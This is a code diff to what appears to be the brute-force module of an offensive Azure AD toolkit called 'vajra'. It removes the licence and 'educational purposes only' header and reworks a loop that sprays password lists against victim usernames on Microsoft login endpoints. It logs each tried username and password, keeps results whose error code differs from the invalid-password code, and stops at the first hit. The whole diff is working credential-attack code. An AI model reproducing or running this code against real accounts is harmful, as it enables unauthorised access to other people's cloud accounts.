@@ -1,25 +1,8 @@
-# Copyright (C) 2022 Raunak Parmar, @trouble1_raunak
-# All rights reserved to Raunak Parmar
 
-# This program is free software: you can redistribute it and/or modify
-# it under the terms of the GNU General Public License as published by
-# the Free Software Foundation, either version 3 of the License, or
-# (at your option) any later version.
 
-# This program is distributed in the hope that it will be useful,
-# but WITHOUT ANY WARRANTY; without even the implied warranty of
-# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
-# GNU General Public License for more details.
-
-# You should have received a copy of the GNU General Public License
-# along with this program. If not, see <http://www.gnu.org/licenses/>.
-
-# This tool is meant for educational purposes only. 
-# The creator takes no responsibility of any mis-use of this tool.
-
-from email import message
 import adal
 from sqlalchemy.sql.expression import false, true
+from vajra.models import AttackStatus
 from vajra import db
 from sqlalchemy.sql import text
 from vajra.models import bruteforceConfig, bruteforceLogs, bruteforceResult
@@ -48,20 +31,19 @@ class bruteforceAttack():
                     error_code = e.error_response['error_codes'][0]
                     error_description = e.error_response['error_description'].split(": ")[1]
                     message = error_description.split("\n")[0]
-                    errorLog = f"<span style=\"color:red\"><br><br>Username: {victim} <br>Password: {password} <br> Message: {message}<br></span>"
-                    db.session.add(bruteforceLogs(uuid=uuid, message=errorLog))
                     if error_code != 50126:
+                        errorLog = f"<span style=\"color:red\"><br><br>Username: {victim} <br>Password: {password} <br> Message: {message}<br></span>"
+                        db.session.add(bruteforceLogs(uuid=uuid, message=errorLog))
                         res = bruteforceResult(uuid=uuid, victim=victim, password=password, errorCode=error_code, message=message, endpoint=endpoint)
                         db.session.add(res)
+                        return true
 
                     db.session.commit()    
-                    return true
+                    return false
+
                 except TypeError as f:
-                    result = str(e)
                     print(e)
                 
-                
-
             if sccuess == true:
                 pass
                 
@@ -83,12 +65,15 @@ class bruteforceAttack():
         for victim in usernames:
             victim = victim.usernames
             db.session.query(bruteforceResult).filter_by(uuid=uuid, victim=victim).delete()
+            
             for password in passwords:
-                password = password.passwords
+                password = password.passwords                
                 message = f"<br><span style=\"color:yellow\">[!] {victim} : {password} </span>" 
                 db.session.add(bruteforceLogs(uuid=uuid, message=message))
+                db.session.commit()
                 res = bruteforceAttack.spray(uuid, password, endpoints, victim)
                 if res == true:
                     break
-            db.session.rollback()
-        db.engine.execute(text("UPDATE attack_status SET bruteforce ='False' WHERE uuid = :uuid"), uuid=uuid)
+        status = AttackStatus.query.filter_by(uuid=uuid).first()
+        status.bruteforce = "False"
+        db.session.commit()
